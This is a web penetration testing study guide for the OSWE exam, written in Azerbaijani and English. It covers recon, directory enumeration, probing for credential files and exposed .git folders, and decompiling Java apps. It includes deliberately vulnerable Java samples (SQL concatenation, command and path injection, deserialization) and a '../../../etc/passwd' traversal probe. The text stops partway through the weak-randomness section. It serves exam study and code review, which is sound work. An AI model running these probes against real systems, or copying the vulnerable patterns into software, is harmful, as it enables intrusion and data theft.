# 🎯 ULTIMATE OSWE & WEB PENETRATION TESTING MASTERCLASS

**Müəllif:** Elite Security Researcher  
**Versiya:** 3.0 Ultimate Edition  
**Məqsəd:** İmtahanda və real həyatda istifadə ediləcək tam təcrübə bələdçisi

---

## 📚 İÇİNDƏKİLƏR

### PART 1: FOUNDATIONS
1. [Metodologiya və Mindset](#1-metodologiya-və-mindset)
2. [Lab Setup və Environment](#2-lab-setup)
3. [İlk 30 Dəqiqə - Methodology](#3-ilk-30-dəqiqə)

### PART 2: RECONNAISSANCE & ENUMERATION
4. [Port Scanning - Advanced](#4-port-scanning)
5. [Web Technology Fingerprinting](#5-web-fingerprinting)
6. [Directory & File Enumeration](#6-directory-enumeration)
7. [Source Code Acquisition](#7-source-code-acquisition)

### PART 3: JAVA DEEP DIVE
8. [Java Architecture Understanding](#8-java-architecture)
9. [JAR/WAR/EAR Analysis](#9-java-archive-analysis)
10. [Java Decompilation Mastery](#10-java-decompilation)
11. [Java Vulnerability Patterns - Complete](#11-java-vulnerabilities)
12. [Spring Framework Analysis](#12-spring-framework)
13. [Struts Exploitation](#13-struts-exploitation)

### PART 4: .NET DEEP DIVE
14. [.NET Architecture](#14-net-architecture)
15. [.NET Decompilation](#15-net-decompilation)
16. [.NET Vulnerability Patterns](#16-net-vulnerabilities)
17. [ASP.NET Specifics](#17-aspnet)

### PART 5: PHP DEEP DIVE
18. [PHP Application Structure](#18-php-structure)
19. [PHP Code Review](#19-php-review)
20. [PHP Framework Analysis](#20-php-frameworks)

### PART 6: PYTHON DEEP DIVE
21. [Python Application Analysis](#21-python-analysis)
22. [Django Security](#22-django)
23. [Flask Security](#23-flask)

### PART 7: NODE.JS & JAVASCRIPT
24. [Node.js Analysis](#24-nodejs)
25. [JavaScript Vulnerabilities](#25-javascript)

### PART 8: DYNAMIC TESTING
26. [Burp Suite Mastery](#26-burp-suite)
27. [Authentication Testing](#27-authentication)
28. [Authorization Testing](#28-authorization)
29. [Business Logic Flaws](#29-business-logic)

### PART 9: EXPLOITATION
30. [Exploit Development Process](#30-exploit-development)
31. [Post-Exploitation](#31-post-exploitation)

### PART 10: DOCUMENTATION
32. [Note-Taking](#32-notes)
33. [Report Writing](#33-report)

---

# PART 1: FOUNDATIONS

# 1. METODOLOGIYA VƏ MINDSET

## The OSWE Mindset

```
1. PATIENCE (Səbir)
   - Kod təhlili vaxt tələb edir
   - Tələsmə, metodoloji ol

2. PERSISTENCE (Davamlılıq)
   - İlk zəiflik tapmasanda davam et
   - Hər pattern-i yoxla

3. METHODOLOGY (Metodologiya)
   - Checklist istifadə et
   - Addım-addım irəlilə

4. DOCUMENTATION (Sənədləşdirmə)
   - HƏR ŞEYİ yaz
   - Screenshot çək

5. TIME MANAGEMENT (Vaxt İdarəsi)
   - 48 saat = 2 gün
   - Break al
   - Prioritize et
```

---

## The Perfect Workflow

```
┌────────────────────────────────────────────┐
│ 1. RECONNAISSANCE                          │
│    ├─ Port Scanning                        │
│    ├─ Technology Detection                 │
│    └─ Initial Browse                       │
└─────────────┬──────────────────────────────┘
              ↓
┌────────────────────────────────────────────┐
│ 2. ENUMERATION                             │
│    ├─ Directory/File Discovery             │
│    ├─ Parameter Discovery                  │
│    └─ Functionality Mapping                │
└─────────────┬──────────────────────────────┘
              ↓
┌────────────────────────────────────────────┐
│ 3. SOURCE CODE ANALYSIS                    │
│    ├─ Get Application Files                │
│    ├─ Decompile if Necessary               │
│    └─ Map Application Flow                 │
└─────────────┬──────────────────────────────┘
              ↓
┌────────────────────────────────────────────┐
│ 4. VULNERABILITY IDENTIFICATION            │
│    ├─ Static Analysis (Grep/Pattern)       │
│    ├─ Code Review (Manual)                 │
│    └─ Dangerous Function Detection         │
└─────────────┬──────────────────────────────┘
              ↓
┌────────────────────────────────────────────┐
│ 5. PROOF OF CONCEPT                        │
│    ├─ Write Simple PoC                     │
│    ├─ Test Locally                         │
│    └─ Document Results                     │
└─────────────┬──────────────────────────────┘
              ↓
┌────────────────────────────────────────────┐
│ 6. EXPLOITATION                            │
│    ├─ Develop Full Exploit                 │
│    ├─ Test on Target                       │
│    └─ Get Shell/Read Flag                  │
└─────────────┬──────────────────────────────┘
              ↓
┌────────────────────────────────────────────┐
│ 7. POST-EXPLOITATION                       │
│    ├─ Screenshot Everything                │
│    ├─ Document Steps                       │
│    └─ Prepare Report                       │
└────────────────────────────────────────────┘
```

---

# 2. LAB SETUP

## Essential Tools

```bash
# Update system
sudo apt update && sudo apt upgrade -y

# Install basics
sudo apt install -y \
    curl wget git vim nano \
    net-tools nmap masscan \
    python3 python3-pip \
    openjdk-11-jdk \
    build-essential

# Web tools
sudo apt install -y \
    burpsuite \
    zaproxy \
    nikto \
    dirb \
    gobuster \
    wfuzz \
    sqlmap

# Decompilers
sudo apt install -y jd-gui

# Python tools
pip3 install requests beautifulsoup4 pwntools

# Download dnSpy (for .NET)
wget https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-net-win64.zip

# CFR (Java decompiler - better than JD-GUI sometimes)
wget https://github.com/leibnitz27/cfr/releases/download/0.152/cfr-0.152.jar

# ysoserial (Java deserialization)
wget https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
```

---

## Workspace Setup

```bash
# Create workspace structure
mkdir -p ~/oswe/{recon,code,exploits,notes,screenshots,reports}

# Create templates directory
mkdir -p ~/oswe/templates/{java,dotnet,php,python}

# Aliases
cat >> ~/.bashrc << 'EOF'
alias oswe='cd ~/oswe'
alias jdgui='jd-gui'
alias cfr='java -jar ~/tools/cfr-0.152.jar'
alias ysoserial='java -jar ~/tools/ysoserial-all.jar'
EOF

source ~/.bashrc
```

---

# 3. İLK 30 DƏQİQƏ

## Minute-by-Minute Plan

### **Minute 0-5: Initial Connection**

```bash
# 1. VPN connect
sudo openvpn oswe-lab.ovpn

# 2. Verify connection
ip a | grep tun
ping -c 2 [LAB_IP]

# 3. Create project folder
mkdir ~/oswe/machine-$(date +%Y%m%d-%H%M)
cd ~/oswe/machine-$(date +%Y%m%d-%H%M)

# 4. Create subdirectories
mkdir {recon,code,exploits,screenshots,notes}
```

---

### **Minute 5-10: Quick Port Scan**

```bash
# Fast scan top 1000 ports
nmap -T4 -p- --min-rate=1000 [TARGET] -oN recon/nmap-quick.txt

# While scanning, browse manually
firefox http://[TARGET] &
```

---

### **Minute 10-15: Technology Detection**

```bash
# Whatweb
whatweb http://[TARGET] -v | tee recon/whatweb.txt

# HTTP Headers
curl -I http://[TARGET] | tee recon/headers.txt

# Manual observation in browser:
# - Error messages (version info?)
# - Login page (what type?)
# - URLs (file extensions? .jsp, .aspx, .php?)
# - Forms (how many? what parameters?)
```

---

### **Minute 15-25: Full Port Scan + Directory Enum**

```bash
# Terminal 1: Full nmap
nmap -sV -sC -p- [TARGET] -oA recon/nmap-full

# Terminal 2: Directory enumeration
gobuster dir \
    -u http://[TARGET] \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x jsp,html,txt,xml,aspx,php \
    -o recon/gobuster.txt \
    -t 50

# Terminal 3: Check for common files
for file in robots.txt sitemap.xml web.config .git/config; do
    curl -I http://[TARGET]/$file
done
```

---

### **Minute 25-30: Initial Notes**

```bash
# Create initial notes
cat > notes/initial-notes.md << EOF
# Target: [IP]
# Date: $(date)

## Technology Stack
- Web Server: 
- Language: 
- Framework: 
- Database: 

## Open Ports
$(grep open recon/nmap-quick.txt | grep -v "Nmap")

## Interesting Directories
$(cat recon/gobuster.txt | grep "Status: 200")

## Next Steps
- [ ] Identify main application
- [ ] Get source code
- [ ] Find authentication mechanism
- [ ] Look for file upload
- [ ] Check for known CVEs
EOF

cat notes/initial-notes.md
```

---

# PART 2: RECONNAISSANCE & ENUMERATION

# 4. PORT SCANNING

## Nmap Mastery

### **Basic Scan**

```bash
# Quick scan
nmap -T4 -F [TARGET]

# Full scan
nmap -p- [TARGET]

# Service detection
nmap -sV [TARGET]

# Default scripts
nmap -sC [TARGET]

# Aggressive
nmap -A [TARGET]

# All together
nmap -sV -sC -p- -T4 -A [TARGET] -oA scan
```

---

### **Web-Focused Scan**

```bash
# Web ports only
nmap -p80,443,8000,8080,8443,8888,9000 -sV -sC [TARGET]

# With HTTP scripts
nmap -p80,443,8080,8443 \
    --script=http-enum,http-headers,http-methods,http-robots.txt,http-title \
    [TARGET]

# Vulnerability scripts
nmap -p80,443,8080 \
    --script=vuln \
    [TARGET]
```

---

### **Masscan (Faster Alternative)**

```bash
# Ultra-fast port discovery
sudo masscan -p1-65535 [TARGET] --rate=1000

# Then detailed nmap on open ports
nmap -sV -sC -p[DISCOVERED_PORTS] [TARGET]
```

---

## Port Analysis Checklist

```
Common Web Ports:
□ 80    - HTTP (Apache/Nginx/IIS?)
□ 443   - HTTPS (Certificate info?)
□ 8000  - Alternative HTTP
□ 8080  - Tomcat/Proxy (manager?)
□ 8443  - HTTPS Alternative
□ 8888  - HTTP Alternative
□ 9000  - PHP-FPM

Java Specific:
□ 8080  - Tomcat (check /manager/html)
□ 8443  - Tomcat HTTPS
□ 9990  - JBoss/Wildfly admin
□ 4848  - GlassFish admin

Database (Internal Access?):
□ 3306  - MySQL
□ 5432  - PostgreSQL
□ 1433  - MSSQL
□ 27017 - MongoDB

Other:
□ 21    - FTP (anonymous login?)
□ 22    - SSH (brute force? weak keys?)
□ 3389  - RDP (Windows?)
```

---

# 5. WEB FINGERPRINTING

## Detailed Technology Detection

### **Method 1: Wappalyzer (Browser Extension)**

```
Install: chrome.google.com/webstore → "Wappalyzer"

Detects:
- Web server
- Programming language
- Framework
- CMS
- JavaScript libraries
- Analytics
- CDN
```

---

### **Method 2: Whatweb**

```bash
# Basic
whatweb http://target.com

# Verbose
whatweb http://target.com -v

# Aggressive
whatweb http://target.com -a 3

# Multiple URLs
whatweb -i urls.txt

# Output to file
whatweb http://target.com -v --log-xml=scan.xml
```

---

### **Method 3: Manual Headers Analysis**

```bash
# Get all headers
curl -I http://target.com

# Look for:
Server: Apache/2.4.41 (Ubuntu)       # Web server
X-Powered-By: PHP/7.4.3              # Language
X-AspNet-Version: 4.0.30319          # .NET version
Set-Cookie: JSESSIONID=...           # Java/Tomcat
Set-Cookie: ASP.NET_SessionId=...    # ASP.NET
```

---

### **Method 4: Error Pages**

```bash
# Trigger 404
curl http://target.com/nonexistent

# Look for:
Apache Tomcat/8.5.50 - Error report  # Java/Tomcat
IIS 10.0 Detailed Error              # .NET/IIS
PHP Warning: ...                     # PHP with debug
Django Debug Page                    # Python/Django
```

---

### **Method 5: Default Pages**

```bash
# Java/Tomcat
curl http://target:8080/
curl http://target:8080/manager/html

# JBoss
curl http://target:8080/admin-console/
curl http://target:9990/console

# Jenkins
curl http://target:8080/login

# WordPress
curl http://target/wp-admin/

# Joomla
curl http://target/administrator/
```

---

## Technology Decision Tree

```
URL Extensions:
├─ .jsp         → Java (Tomcat/JBoss/Wildfly)
├─ .jsf         → JavaServer Faces
├─ .do          → Struts
├─ .action      → Struts
├─ .aspx        → ASP.NET (IIS)
├─ .asp         → Classic ASP
├─ .php         → PHP
├─ .py          → Python (Django/Flask)
└─ No extension → Could be anything (check headers)

Directory Structure:
├─ /WEB-INF/    → Java
├─ /META-INF/   → Java
├─ /bin/        → .NET
├─ /App_Data/   → ASP.NET
├─ /wp-content/ → WordPress (PHP)
└─ /admin/      → Could be anything

Session Cookies:
├─ JSESSIONID      → Java
├─ PHPSESSID       → PHP
├─ ASP.NET_SessionId → ASP.NET
├─ sessionid       → Django (Python)
└─ connect.sid     → Express.js (Node)

Error Messages:
├─ java.lang.NullPointerException    → Java
├─ System.NullReferenceException     → .NET C#
├─ Fatal error: Uncaught Error       → PHP
├─ Traceback (most recent call last) → Python
└─ TypeError: Cannot read property   → JavaScript/Node
```

---

# 6. DIRECTORY ENUMERATION

## Gobuster Advanced Usage

### **Basic Scan**

```bash
gobuster dir \
    -u http://target.com \
    -w /usr/share/wordlists/dirb/common.txt \
    -o gobuster-common.txt
```

---

### **With Extensions**

```bash
# Java
gobuster dir \
    -u http://target.com \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x jsp,jsf,do,action,war,jar \
    -t 50 \
    -o gobuster-java.txt

# .NET
gobuster dir \
    -u http://target.com \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x aspx,asp,config,dll \
    -t 50 \
    -o gobuster-dotnet.txt

# PHP
gobuster dir \
    -u http://target.com \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x php,php3,php4,php5,phtml,inc \
    -t 50 \
    -o gobuster-php.txt

# Python
gobuster dir \
    -u http://target.com \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x py \
    -t 50 \
    -o gobuster-python.txt

# All common
gobuster dir \
    -u http://target.com \
    -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
    -x jsp,aspx,php,html,txt,xml,bak,old,zip,tar.gz \
    -t 50 \
    -o gobuster-all.txt
```

---

### **Status Code Filtering**

```bash
# Only 200
gobuster dir -u http://target.com -w wordlist.txt -s 200

# Multiple codes
gobuster dir -u http://target.com -w wordlist.txt -s "200,204,301,302,307,401,403"

# Exclude codes
gobuster dir -u http://target.com -w wordlist.txt -b "404,500"
```

---

### **Authentication**

```bash
# Basic auth
gobuster dir \
    -u http://target.com \
    -w wordlist.txt \
    -U username \
    -P password

# Cookie
gobuster dir \
    -u http://target.com \
    -w wordlist.txt \
    -c "session=abc123; auth=xyz789"

# Custom header
gobuster dir \
    -u http://target.com \
    -w wordlist.txt \
    -H "Authorization: Bearer token123"
```

---

## Feroxbuster (Recursive Alternative)

```bash
# Basic recursive
feroxbuster -u http://target.com -w wordlist.txt

# Depth limit
feroxbuster -u http://target.com -w wordlist.txt --depth 3

# Extensions
feroxbuster -u http://target.com -w wordlist.txt -x jsp,aspx,php

# Filter by size
feroxbuster -u http://target.com -w wordlist.txt -S 1234

# Threads
feroxbuster -u http://target.com -w wordlist.txt -t 100
```

---

## Critical Files to Look For

### **Java Applications**

```bash
# Check these manually
curl http://target/WEB-INF/web.xml
curl http://target/META-INF/MANIFEST.MF
curl http://target:8080/manager/html
curl http://target:8080/manager/text
curl http://target:8080/host-manager/html
curl http://target/jmx-console/
curl http://target/web-console/
curl http://target/admin-console/
curl http://target/console/

# Look for backups
curl http://target/application.war.bak
curl http://target/backup/
curl http://target/old/

# Source code leaks
curl http://target/.git/config
curl http://target/.svn/entries
```

---

### **ASP.NET Applications**

```bash
curl http://target/web.config
curl http://target/Web.config
curl http://target/app.config
curl http://target/bin/
curl http://target/App_Data/
curl http://target/elmah.axd
curl http://target/trace.axd
curl http://target/ScriptResource.axd
```

---

### **PHP Applications**

```bash
curl http://target/config.php
curl http://target/config.inc.php
curl http://target/db.php
curl http://target/database.php
curl http://target/.env
curl http://target/phpinfo.php
curl http://target/info.php
curl http://target/test.php
curl http://target/backup.sql
curl http://target/dump.sql
curl http://target/composer.json
curl http://target/composer.lock

# WordPress specific
curl http://target/wp-config.php
curl http://target/wp-config.php.bak
curl http://target/wp-content/debug.log

# PHP admin panels
curl http://target/phpmyadmin/
curl http://target/pma/
curl http://target/admin/
```

---

### **Python Applications**

```bash
curl http://target/settings.py
curl http://target/config.py
curl http://target/.env
curl http://target/requirements.txt
curl http://target/manage.py

# Django specific
curl http://target/admin/
curl http://target/__debug__/

# Flask specific
curl http://target/static/
curl http://target/templates/
```

---

### **Universal Critical Files**

```bash
# Information disclosure
curl http://target/robots.txt
curl http://target/sitemap.xml
curl http://target/.htaccess
curl http://target/.DS_Store
curl http://target/crossdomain.xml

# Version control
curl http://target/.git/HEAD
curl http://target/.git/config
curl http://target/.svn/entries
curl http://target/.hg/

# Backups
curl http://target/backup.zip
curl http://target/backup.tar.gz
curl http://target/old.zip
curl http://target/site.zip

# Readme/docs
curl http://target/README.md
curl http://target/CHANGELOG.md
curl http://target/TODO.txt
curl http://target/notes.txt

# Logs
curl http://target/error.log
curl http://target/access.log
curl http://target/debug.log
```

---

# 7. SOURCE CODE ACQUISITION

## Method 1: SSH Access

```bash
# If you have SSH credentials
ssh student@target

# Find web root
ls -la /var/www/
ls -la /opt/
ls -la /usr/local/
ls -la /home/

# Find Java apps
find / -name "*.war" 2>/dev/null
find / -name "*.ear" 2>/dev/null
find / -name "*.jar" 2>/dev/null
find / -type d -name "webapps" 2>/dev/null

# Find Tomcat
ps aux | grep tomcat
ls -la /opt/tomcat*/webapps/
ls -la /var/lib/tomcat*/webapps/

# Find .NET apps
find / -name "*.dll" 2>/dev/null
find / -name "web.config" 2>/dev/null
find / -name "*.aspx" 2>/dev/null

# Find PHP apps
find /var/www/ -name "*.php"
find / -name "config.php" 2>/dev/null

# Find Python apps
find / -name "manage.py" 2>/dev/null
find / -name "wsgi.py" 2>/dev/null
find / -name "app.py" 2>/dev/null
```

---

### **Transfer Files**

```bash
# Single file
scp user@target:/path/to/app.war ./

# Directory
scp -r user@target:/path/to/app/ ./

# Create archive first (recommended for large apps)
ssh user@target
tar czf /tmp/app.tar.gz /opt/application/
exit

scp user@target:/tmp/app.tar.gz ./
tar xzf app.tar.gz

# Multiple files with pattern
scp user@target:"/opt/app/*.war" ./
```

---

## Method 2: Git Repository Exposure

```bash
# Check if .git exists
curl http://target/.git/config

# If exists, use git-dumper
git clone https://github.com/arthaud/git-dumper.git
cd git-dumper
pip3 install -r requirements.txt

python3 git_dumper.py http://target/.git/ output/

# Or wget recursive
wget -r http://target/.git/

# Restore repository
cd output/
git checkout -- .
```

---

## Method 3: Directory Listing

```bash
# If directory listing enabled
wget -r -np -nH --cut-dirs=1 http://target/app/

# Or use curl with loop
for file in $(curl -s http://target/backup/ | grep -oP 'href="\K[^"]+'); do
    wget http://target/backup/$file
done
```

---

## Method 4: Error-Based Disclosure

```bash
# Trigger errors to reveal paths
curl http://target/nonexistent.jsp
curl http://target/test.aspx?id=abc
curl http://target/index.php?file=../../../etc/passwd

# Look for stack traces showing:
# - File paths
# - Class names
# - Framework versions
```

---

## Method 5: Backup Files

```bash
# Common backup patterns
for backup in .bak .old .backup .zip .tar.gz ~; do
    curl http://target/app.war$backup
    curl http://target/web.config$backup
    curl http://target/config.php$backup
done

# Timestamped backups
for date in 2023 2024 2025; do
    curl http://target/backup-$date.zip
    curl http://target/app-$date.tar.gz
done
```

---

# PART 3: JAVA DEEP DIVE

# 8. JAVA ARCHITECTURE

## Understanding Java Web Applications

### **Servlet Container (e.g., Tomcat) Architecture**

```
                    ┌──────────────────┐
                    │   HTTP Request   │
                    └────────┬─────────┘
                             ↓
                    ┌──────────────────┐
                    │  Tomcat/Jetty    │
                    │  (Servlet Engine)│
                    └────────┬─────────┘
                             ↓
                    ┌──────────────────┐
                    │    Filters       │
                    │  (Security, etc) │
                    └────────┬─────────┘
                             ↓
                    ┌──────────────────┐
                    │    Servlets      │
                    │   (Controllers)  │
                    └────────┬─────────┘
                             ↓
                    ┌──────────────────┐
                    │  Business Logic  │
                    │   (Services)     │
                    └────────┬─────────┘
                             ↓
                    ┌──────────────────┐
                    │   Data Access    │
                    │    (DAO/ORM)     │
                    └────────┬─────────┘
                             ↓
                    ┌──────────────────┐
                    │    Database      │
                    └──────────────────┘
```

---

### **Package Structure**

```
com.company.app/
├── controller/          # HTTP request handlers
│   ├── LoginController.java
│   ├── UserController.java
│   └── AdminController.java
├── service/            # Business logic
│   ├── AuthService.java
│   ├── UserService.java
│   └── EmailService.java
├── dao/                # Database access
│   ├── UserDAO.java
│   └── ProductDAO.java
├── model/              # Data models
│   ├── User.java
│   └── Product.java
├── util/               # Utilities
│   ├── CryptoUtil.java
│   ├── ValidationUtil.java
│   └── StringUtil.java
├── filter/             # Request filters
│   ├── AuthFilter.java
│   └── LoggingFilter.java
└── config/             # Configuration
    └── AppConfig.java
```

---

## Common Java Web Frameworks

### **1. Spring / Spring Boot**

**Characteristics:**
- Annotations: `@Controller`, `@Service`, `@Repository`
- Dependency Injection
- URL mapping: `@RequestMapping`, `@GetMapping`, `@PostMapping`

**Key Files:**
```
application.properties
application.yml
pom.xml (Maven) or build.gradle (Gradle)
```

---

### **2. Struts**

**Characteristics:**
- struts.xml configuration
- Action classes extend ActionSupport
- OGNL (Object-Graph Navigation Language)

**Known Vulnerabilities:**
- OGNL injection (CVE-2017-5638, etc.)
- Dynamic method invocation

---

### **3. JavaServer Faces (JSF)**

**Characteristics:**
- .xhtml pages
- Managed beans: `@ManagedBean`
- Expression Language (EL)

**Vulnerabilities:**
- EL injection
- ViewState manipulation

---

### **4. Vanilla Servlets**

**Characteristics:**
- web.xml configuration
- Classes extend HttpServlet
- doGet(), doPost() methods

---

# 9. JAVA ARCHIVE ANALYSIS

## Archive Types

### **JAR (Java Archive)**

```bash
# Structure
mylib.jar
├── META-INF/
│   └── MANIFEST.MF
└── com/
    └── company/
        └── MyClass.class

# Extract
jar xf mylib.jar
# Or
unzip mylib.jar

# List contents
jar tf mylib.jar
# Or
unzip -l mylib.jar

# View MANIFEST
unzip -p mylib.jar META-INF/MANIFEST.MF
```

---

### **WAR (Web Application Archive)**

```bash
# Structure
app.war
├── META-INF/
│   └── MANIFEST.MF
├── WEB-INF/
│   ├── classes/           # Compiled application code
│   │   └── com/
│   │       └── company/
│   │           ├── servlet/
│   │           ├── service/
│   │           └── dao/
│   ├── lib/              # External dependencies (JARs)
│   │   ├── spring-core.jar
│   │   ├── hibernate.jar
│   │   └── custom-lib.jar
│   ├── web.xml           # Deployment descriptor (CRITICAL!)
│   └── *.properties
├── resources/
├── static/
├── templates/
├── index.jsp
├── login.jsp
└── *.jsp files

# Extract
mkdir app
unzip app.war -d app/
cd app/

# Key files to examine immediately:
WEB-INF/web.xml           # Servlet mappings, filters, security
WEB-INF/classes/          # Your application code
WEB-INF/lib/              # Third-party JARs (check for custom libs)
```

---

### **EAR (Enterprise Archive)**

```bash
# Structure
app.ear
├── META-INF/
│   └── application.xml   # EAR descriptor (where libs are)
├── APP-INF/
│   └── lib/              # Shared libraries (CHECK HERE!)
│       └── core.jar
├── module1.war
├── module2.war
└── ejb.jar

# Extract
mkdir app
unzip app.ear -d app/
cd app/

# application.xml tells you where libraries are
cat META-INF/application.xml

# Example application.xml:
<library-directory>APP-INF/lib</library-directory>

# So check APP-INF/lib/ for custom JARs
ls -la APP-INF/lib/
```

---

## Step-by-Step WAR Analysis

```bash
# 1. Extract
mkdir myapp
unzip myapp.war -d myapp/
cd myapp/

# 2. Examine structure
tree -L 3

# 3. Read web.xml FIRST
cat WEB-INF/web.xml

# Look for:
# - Servlet mappings (URL patterns)
# - Filters (security filters?)
# - Security constraints
# - Context parameters (debug mode?)

# 4. List compiled classes
find WEB-INF/classes/ -name "*.class" | head -20

# 5. List external JARs
ls -lh WEB-INF/lib/

# 6. Identify custom JARs (not from Maven Central)
# Look for company-specific names:
ls WEB-INF/lib/ | grep -v "apache\|spring\|hibernate\|javax"

# 7. Check for property files (credentials?)
find . -name "*.properties"
find . -name "*.xml" | grep -v ".class"

# 8. Decompile with JD-GUI
jd-gui WEB-INF/lib/custom-core.jar &
```

---

# 10. JAVA DECOMPILATION

## Tool Comparison

### **JD-GUI** (Recommended for beginners)
- ✅ Easy to use (GUI)
- ✅ Fast
- ✅ Good for browsing
- ❌ Sometimes fails on complex code

### **CFR** (Recommended for experts)
- ✅ More accurate decompilation
- ✅ Handles Java 8+ features better
- ✅ Command-line (scriptable)
- ❌ No GUI

### **Procyon**
- ✅ Good alternative
- ✅ Handles lambdas well
- ❌ Can be slow

---

## JD-GUI Deep Dive

```bash
# Install
sudo apt install jd-gui

# Open WAR directly
jd-gui myapp.war &

# Open specific JAR
jd-gui WEB-INF/lib/core.jar &
```

---

### **JD-GUI Interface Navigation**

```
┌─────────────────────────────────────────────────┐
│ File  Edit  Navigation  Search  Help            │
├──────────────┬──────────────────────────────────┤
│              │                                  │
│  Package     │  public class LoginServlet {     │
│  Explorer    │      protected void doPost(      │
│  (Tree)      │          HttpServletRequest req, │
│              │          HttpServletResponse res │
│  📁 com      │      ) {                         │
│   📁 company │          String username =       │
│    📁 app    │              req.getParameter(   │
│     📄 Login │              "username");        │
│     📄 User  │          // ...                  │
│     📄 Admin │      }                           │
│              │  }                               │
│              │                                  │
└──────────────┴──────────────────────────────────┘
```

---

### **Essential JD-GUI Shortcuts**

```
NAVIGATION:
Ctrl + T              - Open Type (class search by name)
Ctrl + Shift + T      - Open Type in Hierarchy
Ctrl + Click          - Go to definition
F3                    - Go to declaration
Alt + ←               - Back
Alt + →               - Forward

SEARCH:
Ctrl + F              - Find in current file
Ctrl + Shift + F      - Search in all files (MOST IMPORTANT!)
F3 (after search)     - Next occurrence

VIEW:
Ctrl + +              - Zoom in
Ctrl + -              - Zoom out
Ctrl + 0              - Reset zoom

FILE:
Ctrl + S              - Save current file as .java
Ctrl + Shift + S      - Save all sources
Ctrl + O              - Open file
```

---

### **Strategic Search in JD-GUI**

**CRITICAL: Use Ctrl+Shift+F (Search All Files)**

```
Search Box: [                    ]
☑ Case sensitive
☐ Regex
☑ Declarations
☑ References
☑ Strings
```

---

#### **Search Pattern 1: Authentication Vulnerabilities**

```
Step 1: Search for login-related classes
Search: "login"
Look in results for: LoginServlet, AuthenticationFilter, etc.

Step 2: Search for password handling
Search: "password"
Look for: getPassword, setPassword, validatePassword

Step 3: Search for session management
Search: "session"
Look for: HttpSession, SessionManager, createSession

Step 4: Search for SQL queries in auth
Search: "SELECT * FROM users WHERE"
Look for: String concatenation (+ operator)
```

---

#### **Search Pattern 2: Weak Randomness**

```
Search: "new Random"
Look for: new Random(System.currentTimeMillis())

Then search for where it's used:
Search: "generateToken"
Search: "createToken"
Search: "resetToken"
Search: "sessionId"

Example hit:
public String generateToken() {
    Random random = new Random(System.currentTimeMillis());  ← VULNERABLE!
    // ...
}
```

---

#### **Search Pattern 3: SQL Injection**

```
Search 1: "executeQuery"
Look for: stmt.executeQuery("... + ...)

Search 2: "Statement.create"
Look for: conn.createStatement()
Then check if it uses concatenation

Search 3: "+ request.getParameter"
Direct hit on user input concatenation

Example vulnerable code:
String id = request.getParameter("id");
String query = "SELECT * FROM users WHERE id=" + id;  ← VULNERABLE!
stmt.executeQuery(query);
```

---

#### **Search Pattern 4: Command Injection**

```
Search: "Runtime.getRuntime"
Search: "ProcessBuilder"
Search: "exec("

Example hit:
String cmd = request.getParameter("cmd");
Runtime.getRuntime().exec("ping " + cmd);  ← VULNERABLE!
```

---

#### **Search Pattern 5: Path Traversal**

```
Search: "new File"
Look for: new File(... + request.getParameter ...

Search: "FileInputStream"
Search: "FileReader"

Example:
String filename = request.getParameter("file");
File f = new File("/uploads/" + filename);  ← VULNERABLE!
```

---

#### **Search Pattern 6: Deserialization**

```
Search: "readObject"
Search: "ObjectInputStream"
Search: "Serializable"

Example:
ObjectInputStream ois = new ObjectInputStream(inputStream);
Object obj = ois.readObject();  ← POTENTIALLY VULNERABLE!
```

---

#### **Search Pattern 7: Hardcoded Secrets**

```
Search: "password" + "="
Search: "secret" + "="
Search: "api" + "key"
Search: "jdbc:"

Example:
String dbPassword = "admin123";  ← HARDCODED!
String jdbcUrl = "jdbc:mysql://localhost/db?user=root&password=root";  ← HARDCODED!
```

---

### **Code Review Workflow in JD-GUI**

```
1. Open application WAR/JAR
   
2. Search for authentication:
   Ctrl+Shift+F → "login"
   
3. Find LoginServlet or similar
   
4. Read authentication logic:
   - How is password checked?
   - SQL injection possible?
   - Session management secure?
   
5. Trace method calls:
   - Click on method names
   - Follow the call chain
   - Look for vulnerable patterns
   
6. Check utility classes:
   - Search for "Util"
   - Look at crypto functions
   - Check random generators
   
7. Examine DAO/Repository:
   - Search for "DAO" or "Repository"
   - Check SQL queries
   - Look for PreparedStatement usage
   
8. Review filters:
   - Search for "Filter"
   - Check authentication filters
   - Look for authorization checks
```

---

## CFR Usage (Alternative)

```bash
# Download
wget https://github.com/leibnitz27/cfr/releases/download/0.152/cfr-0.152.jar

# Decompile single class
java -jar cfr-0.152.jar MyClass.class

# Decompile JAR to directory
java -jar cfr-0.152.jar myapp.jar --outputdir src/

# Decompile with better formatting
java -jar cfr-0.152.jar myapp.jar \
    --outputdir src/ \
    --caseinsensitivefs true \
    --silent true

# Then grep through decompiled source
cd src/
grep -r "new Random(System.currentTimeMillis" .
grep -r "executeQuery.*+" .
```

---

# 11. JAVA VULNERABILITIES - COMPLETE

## Vulnerability #1: Weak Random Number Generation

### **The Vulnerability**

```java
// VULNERABLE CODE
import java.util.Random;

public class TokenGenerator {
    public String generateResetToken() {
        Random random = new Random(System.currentTimeMillis());
        // ↑ PROBLEM: Predictable seed!
        
        StringBuilder token = new StringBuilder();
        String charset = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
        
        for (int i = 0; i < 40; i++) {
            token.append(charset.charAt(random.nextInt(charset.length())));
        }
        
        return token.toString();
    }
}
```

---

### **Why It's Vulnerable**

```java
// Demonstration of predictability
public class Demo {
    public static void main(String[] args) {
        long seed = System.currentTimeMillis();
        
        Random r1 = new Random(seed);
        Random r2 = new Random(seed);
        
        System.out.println("First Random:");
        for (int i = 0; i < 5; i++) {
            System.out.println(r1.nextInt(100));
        }
        
        System.out.println("\nSecond Random (same seed):");
        for (int i = 0; i < 5; i++) {
            System.out.println(r2.nextInt(100));  // SAME VALUES!
        }
    }
}

// Output:
// First Random:
// 42
// 17
// 89
// 3
// 55
//
// Second Random (same seed):
// 42  ← SAME!
// 17  ← SAME!
// 89  ← SAME!
// 3   ← SAME!
// 55  ← SAME!
```

---

### **How to Find**

```bash
# JD-GUI Search:
Ctrl+Shift+F → "new Random(System.currentTimeMillis"

# Grep in decompiled source:
